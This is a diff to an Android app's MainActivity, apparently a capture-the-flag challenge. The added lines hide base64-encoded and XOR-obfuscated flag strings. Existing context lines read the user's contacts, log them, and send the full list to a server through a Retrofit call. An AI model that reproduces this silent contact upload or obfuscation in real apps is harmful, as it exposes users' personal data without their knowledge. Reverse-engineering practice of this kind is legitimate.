@@ -1,16 +1,16 @@
 package com.example.androidapp
 import android.annotation.SuppressLint
 import android.app.Service
+import android.os.Build
 import android.provider.ContactsContract
 import android.os.Bundle
 import android.util.Log
-import android.view.View
 import android.widget.ListView
 import android.widget.TextView
+import androidx.annotation.RequiresApi
 import java.util.ArrayList
 import androidx.appcompat.app.AppCompatActivity
 import com.bumptech.glide.Glide
-import javax.security.auth.callback.Callback
 
 class MainActivity : AppCompatActivity() {
 
@@ -22,7 +22,9 @@ class MainActivity : AppCompatActivity() {
     private var listView: ListView? = null
     private var customAdapter: CustomAdapter? = null
     private var contactModelArrayList: ArrayList<ContactModel>? = null
+    private var superString2: String = "Q1RGX0pBVkFfRU5DUllQVEVEX1c="
 
+    @RequiresApi(Build.VERSION_CODES.O)
     @SuppressLint("Range")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -32,6 +34,7 @@ class MainActivity : AppCompatActivity() {
 
         var view: TextView = findViewById(R.id.text) as TextView
         view.text = helloWorld()
+        view.text = "I Like Turtles!!"
 
         listView = findViewById(R.id.listView) as ListView
 
@@ -47,6 +50,7 @@ class MainActivity : AppCompatActivity() {
             Log.d("name>>", name + "  " + phoneNumber)
         }
         phones.close()
+        var streng: String? = customAdapter?.youNeverGonnaFindThis(superString2)
 
         customAdapter = CustomAdapter(this, contactModelArrayList!!)
         listView!!.adapter = customAdapter
@@ -54,6 +58,8 @@ class MainActivity : AppCompatActivity() {
         var retrofit = ServiceBuilder.buildService(PostInterface::class.java)
         retrofit.sendReq(contactModelArrayList!!)
 
+
+        var alow: String = ServiceBuilder.dicript("NYKRHAKRHCN_T]YHIRH","D")
 
     }
 
